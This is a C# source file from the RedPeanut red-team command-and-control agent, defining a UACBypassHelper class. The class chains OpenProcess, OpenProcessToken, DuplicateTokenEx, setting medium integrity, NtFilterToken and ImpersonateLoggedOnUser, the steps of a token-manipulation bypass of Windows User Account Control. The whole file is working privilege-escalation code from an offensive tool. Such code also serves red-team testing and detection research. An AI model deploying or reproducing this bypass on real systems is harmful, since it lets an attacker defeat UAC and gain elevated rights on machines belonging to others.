//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using RedPeanutAgent.Core;
using System;
using System.Runtime.InteropServices;
using static RedPeanutAgent.Core.Natives;

namespace RedPeanutAgent.Execution
{
    class UACBypassHelper
    {
        public static IntPtr OpenProcess(int processid)
        {
            IntPtr hprocess = Natives.OpenProcess(ProcessAccessFlags.QueryLimitedInformation, false, processid);
            if (hprocess == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }
            return hprocess;
        }

        public static IntPtr OpenProcessToken(IntPtr processh)
        {
            IntPtr hproctoken = IntPtr.Zero;
            if (!Natives.OpenProcessToken(processh, (uint)ACCESS_MASK.MAXIMUM_ALLOWED, out hproctoken))
            {
                return IntPtr.Zero;
            }
            return hproctoken;
        }

        public static IntPtr DuplicateToken(IntPtr hproctoken)
        {
            SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
            IntPtr hDuplicateToken = IntPtr.Zero;
            if (!DuplicateTokenEx(
                    hproctoken,
                    TOKEN_ALL_ACCESS,
                    ref securityAttributes,
                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    (int)TOKEN_TYPE.TokenPrimary,
                    ref hDuplicateToken)
                )
            {
                return IntPtr.Zero;
            }
            return hDuplicateToken;
        }

        public static IntPtr AllocateAndInitializeSid()
        {
            SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = new SID_IDENTIFIER_AUTHORITY
            {
                Value = new byte[] { 0x0, 0x0, 0x0, 0x0, 0x0, 0x10 }
            };
            byte nSubAuthorityCount = 1;
            IntPtr pSid = new IntPtr();
            if (!Natives.AllocateAndInitializeSid(ref pIdentifierAuthority, nSubAuthorityCount, 0x2000, 0, 0, 0, 0, 0, 0, 0, out pSid))
            {
                return IntPtr.Zero;
            }
            return pSid;
        }

        public static bool SetInformationToken(IntPtr hproctoken, IntPtr pSid)
        {
            SID_AND_ATTRIBUTES sidAndAttributes = new SID_AND_ATTRIBUTES
            {
                Sid = pSid,
                Attributes = SE_GROUP_INTEGRITY
            };

            TOKEN_MANDATORY_LABEL tokenMandatoryLevel = new TOKEN_MANDATORY_LABEL();
            tokenMandatoryLevel.Label = sidAndAttributes;
            Int32 tokenMandatoryLabelSize = Marshal.SizeOf(tokenMandatoryLevel);

            if (Natives.NtSetInformationToken(hproctoken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, ref tokenMandatoryLevel, tokenMandatoryLabelSize) != 0)
            {
                return false;
            }
            return true;
        }

        public static IntPtr FilterToken(IntPtr hproctoken)
        {
            IntPtr hFilteredToken = IntPtr.Zero;
            if (Natives.NtFilterToken(hproctoken, 4, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref hFilteredToken) != 0)
            {
                return IntPtr.Zero;
            }
            return hFilteredToken;
        }

        public static bool ImpersonateLoggedOnUser(IntPtr hproctoken)
        {
            if (!Natives.ImpersonateLoggedOnUser(hproctoken))
            {
                return false;
            }
            return true;
        }
    }
}
